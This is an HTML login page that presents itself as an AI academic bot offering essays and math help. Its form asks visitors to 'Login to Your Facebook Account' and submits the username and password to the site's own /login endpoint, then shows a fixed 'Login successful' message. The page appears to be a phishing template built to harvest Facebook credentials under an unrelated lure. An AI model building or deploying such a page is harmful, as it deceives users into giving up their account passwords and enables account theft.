<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI-Powered Academic Bot - Login</title>
    <link rel="stylesheet" href="/styles.css">
    <script>
        // Function to show and hide the notification
        function showNotification() {
            var notification = document.getElementById('notification');
            notification.style.display = 'block';
            setTimeout(function() {
                notification.style.display = 'none';
            }, 3000); // Hide after 3 seconds (3000 milliseconds)
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1 class="form-title">Login to Your Facebook Account</h1>
            <form action="/login" method="POST" class="login-form" onsubmit="showNotification()">
                <div class="form-group">
                    <label for="username" class="label">Username</label>
                    <input type="text" id="username" name="username" class="form-input" required>
                </div>
                <div class="form-group">
                    <label for="password" class="label">Password</label>
                    <input type="password" id="password" name="password" class="form-input" required>
                </div>
                <button type="submit" class="submit-button">Login</button>
            </form>
        </div>
        <div class="bot-info">
            <h2 class="bot-title">Your Personal Academic Bot</h2>
            <p class="bot-description">Login to access your AI-powered bot capable of answering academic questions, generating essays, solving math problems, and more.</p>
            <p class="bot-description">Experience the future of education at your fingertips.</p>
        </div>
    </div>

    <!-- Notification pop-up -->
    <div id="notification" class="notification">
        <p>Login successful! Access granted.</p>
    </div>
</body>
</html>
